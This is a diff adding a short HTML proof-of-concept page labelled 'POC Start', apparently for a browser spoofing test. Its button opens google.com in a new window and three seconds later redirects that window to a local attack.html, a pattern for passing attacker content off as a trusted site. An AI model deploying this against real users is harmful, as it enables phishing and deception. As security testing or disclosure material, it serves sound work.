@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Start Page</title>
+</head>
+<body>
+    <h1>POC Start</h1>
+    <button onclick="startAttack()">Start Spoof Test</button>
+    <script>
+        function startAttack() {
+            // Step 1: Open Google in a new tab (or same tab)
+            var w = window.open('https://www.google.com');
+            
+            // Step 2: After 3 seconds, redirect the opened tab to attack.html
+            setTimeout(function() {
+                w.location.href = 'attack.html';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
